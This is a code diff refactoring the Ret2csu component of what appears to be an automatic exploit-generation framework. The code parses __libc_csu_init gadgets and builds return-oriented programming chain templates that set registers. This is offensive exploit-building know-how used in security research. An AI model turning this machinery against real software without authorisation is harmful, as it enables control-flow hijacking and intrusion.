@@ -123,8 +123,11 @@ Ret2csu::getRopSubchains(const ref<Expr> &retAddr,
 
     // If arg1 cannot fit within EDI, chain the gadgets to set RDI.
     if (evaluate<uint64_t>(arg1) >= (static_cast<uint64_t>(1) << 32)) {
-        uint64_t gadgetAddr = g_crax->getExploit().resolveGadget("pop rdi ; ret");
-        ret.back() = ConstantExpr::create(gadgetAddr, Expr::Int64);
+        const Exploit &exploit = g_crax->getExploit();
+        const ELF &elf = exploit.getElf();
+        uint64_t gadgetAddr = exploit.resolveGadget("pop rdi ; ret");
+
+        ret.back() = BaseOffsetExpr::create(elf, gadgetAddr);
         ret.push_back(arg1);
         ret.push_back(retAddr);
     }
@@ -145,9 +148,12 @@ Ret2csu::getRopSubchains(uint64_t retAddr,
 }
 
 void Ret2csu::parseLibcCsuInit() {
+    const Exploit &exploit = g_crax->getExploit();
+    const ELF &elf = exploit.getElf();
+
     // Since there are several variants of __libc_csu_init(),
     // we'll manually disassemble it and parse the offsets of its two gadgets.
-    m_libcCsuInit = g_crax->getExploit().getElf().symbols()[s_libcCsuInit];
+    m_libcCsuInit = elf.symbols()[s_libcCsuInit];
 
     // Convert instruction generator into a list of instructions.
     std::vector<Instruction> insns = disas().disasm(s_libcCsuInit);
@@ -159,8 +165,7 @@ void Ret2csu::parseLibcCsuInit() {
             continue;
         }
 
-        m_libcCsuInitGadget1
-            = insns[i + 1].address - g_crax->getExploit().getElf().getBase();
+        m_libcCsuInitGadget1 = insns[i + 1].address - elf.getBase();
 
         m_gadget1Regs.reserve(7);
         for (int j = i + 1; j < i + 8; j++) {
@@ -189,8 +194,7 @@ void Ret2csu::parseLibcCsuInit() {
         assert(insns[i - 2].mnemonic == "mov");
         assert(insns[i - 3].mnemonic == "mov");
 
-        m_libcCsuInitGadget2
-            = insns[i].address - 3 * X86_64_MOV_INSN_LEN - g_crax->getExploit().getElf().getBase();
+        m_libcCsuInitGadget2 = insns[i].address - 3 * X86_64_MOV_INSN_LEN - elf.getBase();
 
         for (int j = i - 3; j < i; j++) {
             const std::string &opStr = insns[j].opStr;
@@ -214,6 +218,9 @@ void Ret2csu::parseLibcCsuInit() {
 }
 
 void Ret2csu::searchGadget2CallTarget(std::string funcName) {
+    const Exploit &exploit = g_crax->getExploit();
+    const ELF &elf = exploit.getElf();
+
     uint64_t funcAddr = g_crax->getExploit().getElf().getRuntimeAddress(funcName);
     std::vector<uint8_t> funcAddrBytes = p64(funcAddr);
     std::vector<uint64_t> candidates = mem().search(funcAddrBytes);
@@ -224,10 +231,12 @@ void Ret2csu::searchGadget2CallTarget(std::string funcName) {
     }
 
     // XXX: this only works for candidates in _DYNAMIC.
-    m_libcCsuInitCallTarget = candidates[0] - g_crax->getExploit().getElf().getBase();
+    m_libcCsuInitCallTarget = candidates[0] - elf.getBase();
 }
 
 void Ret2csu::buildRopSubchainTemplate() const {
+    const Exploit &exploit = g_crax->getExploit();
+
     std::map<std::string, std::string> transform = {
         {"rsp", "4141414141414141"},
         {"rbx", "0"},
@@ -242,9 +251,7 @@ void Ret2csu::buildRopSubchainTemplate() const {
     m_ropSubchainTemplate.resize(1);
 
     RopSubchain &rop = m_ropSubchainTemplate[0];
-
-    // XXX: gadget1 is not in elf.sym
-    rop.push_back(BaseOffsetExpr::create(g_crax->getExploit(), "", s_libcCsuInitGadget1));
+    rop.push_back(BaseOffsetExpr::create(exploit, s_libcCsuInitGadget1));
     for (int i = 0; i < 7; i++) {
         std::string content = transform[m_gadget1Regs[i]];
 
@@ -254,10 +261,10 @@ void Ret2csu::buildRopSubchainTemplate() const {
             uint64_t val = std::stoull(content, nullptr, 16);
             rop.push_back(ConstantExpr::create(val, Expr::Int64));
         } else {
-            rop.push_back(BaseOffsetExpr::create(g_crax->getExploit(), "", content));
+            rop.push_back(BaseOffsetExpr::create(exploit, content));
         }
     }
-    rop.push_back(BaseOffsetExpr::create(g_crax->getExploit(), "", s_libcCsuInitGadget2));
+    rop.push_back(BaseOffsetExpr::create(exploit, s_libcCsuInitGadget2));
     for (int i = 0; i < 7; i++) {
         rop.push_back(ConstantExpr::create(0x4141414141414141, Expr::Int64));
     }
